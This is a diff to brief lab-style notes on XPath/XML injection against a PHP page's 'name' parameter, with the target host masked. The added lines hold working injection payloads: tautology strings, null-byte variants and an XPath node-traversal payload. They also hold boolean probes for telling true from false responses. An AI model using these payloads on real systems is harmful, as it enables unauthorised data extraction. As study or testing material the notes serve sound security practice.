@@ -1,6 +1,16 @@
 # Orig request
 http://xxx.xxx.xxx.xxx/xml/example2.php?name=hacker
-Attacks
+
+Attacks - Run org request then run attacks, look for differences. You may see more data than expected.
 http://xxx.xxx.xxx.xxx/xml/example2.php?name=hacker'%20or%201=1%20or%20'a'='a
 http://xxx.xxx.xxx.xxx/xml/example2.php?name=hacker' or 1=1 or 'a'='a
 
+Attacks used for testing
+'%20or%201=1%20or%20'a'='a
+'%20or%201=1%20or%20'a'='a%00
+'%20or%201=1]/parent::*/child::node()%00
+
+' and '1'='1 and you should get the same result.
+' or '1'='0 and you should get the same result.
+' and '1'='0 and you should not get any result.
+' or '1'='1 and you should get all results.
